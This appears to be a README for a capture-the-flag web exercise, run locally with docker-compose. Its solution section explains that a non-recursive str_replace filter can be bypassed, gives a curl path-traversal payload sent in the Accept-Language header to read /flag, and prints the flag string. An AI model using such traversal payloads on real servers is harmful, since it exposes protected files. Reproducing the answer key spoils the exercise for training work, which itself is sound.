# Flags

### 📄 Description
Welcome to fun with flags.

Flag is at /flag

### ⚙ How to run it
Be sure that the the entire folder has the right permissions.
To do it, open the terminal and write:
```bash
chmod -R +rx ./
```

To execute the exercise, do the following on the terminal:
```bash
sudo docker-compose up
```

### ⛔ Rules
You don't have access to `data` folder.

<details>
    <summary>
        <h2>🔑 Solution</h2>
    </summary>
    
* we can see the php source code
* it uses `str_replace` to "escape" the header and prevent path traversal
* `str_replace` doesn't recursively replace the source string so it's easily bypassed

```
curl 'http://localhost:1235/' -H 'Accept-Language: ....//....//....//....//flag'
```

<h3> 🚩 Flag </h3>

```
35c3_this_flag_is_the_be5t_fl4g
```
</details>